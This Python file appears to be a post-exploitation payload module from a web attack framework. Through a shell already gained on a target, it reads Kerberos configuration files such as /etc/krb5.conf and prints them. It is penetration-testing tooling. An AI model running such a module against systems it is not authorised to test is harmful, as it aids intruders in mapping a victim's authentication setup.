import re
from plugins.attack.payloads.base_payload import base_payload

class kerberos_config_files(base_payload):
    '''
    This payload shows Kerberos configuration files
    '''
    def api_read(self):
        result = {}
        files = []

        files.append('/etc/krb5.conf')
        files.append('/etc/krb5/krb5.conf')
        #files.append('c:\winnt\krb5.ini')

        for file in files:
            content = self.shell.read(file)
            if content:
                result.update({file:content})
        return result
        
    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('Kerberos Config Files')
            for file, content in hashmap.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        if result == [ ]:
            result.append('Kerberos not found.')
        return result
        
